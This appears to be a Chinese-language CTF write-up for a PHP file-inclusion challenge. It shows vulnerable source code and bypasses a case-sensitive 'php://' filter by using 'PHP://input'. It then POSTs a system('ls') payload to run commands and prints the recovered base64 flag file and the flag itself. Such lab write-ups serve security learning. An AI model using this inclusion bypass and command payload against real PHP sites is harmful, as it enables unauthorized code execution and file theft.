---
layout: post
title:  Web_php_include
date:   2021-06-20 00:01:01 +0300
image:  2021-06-20-thunderstorm.jpg
tags:   [ctf,web,php]
---

打开网页

```assembly
<?php
show_source(__FILE__);
echo $_GET['hello'];
$page=$_GET['page'];
while (strstr($page, "php://")) {
    $page=str_replace("php://", "", $page);
}
include($page);
?>
```

strstr() 查找字符串首次出现的位置。返回字符串剩余部分。

str_replace()以其他字符替换字符串中的一些字符。

在使用php伪协议时，可以将php://改写为PHP://从而绕过检查。

首先查看当前路径下有什么文件，从而确定flag含于哪个文件。

使用伪协议

?page=PHP://input

post`<?php system("ls")?>`

![]({{site.baseurl}}/img/2021-06-20-files.jpg)

得到文件fl4gisisish3r3.php index.php phpinfo.php

然后利用文件包含获得fl4gisisish3r3.php文件的内容

PD9waHAKJGZsYWc9ImN0Zns4NzZhNWZjYS05NmM2LTRjYmQtOTA3NS00NmYwYzg5NDc1ZDJ9IjsKPz4K

base64解码得到

```assembly
<?php
$flag="ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}";
?>
```

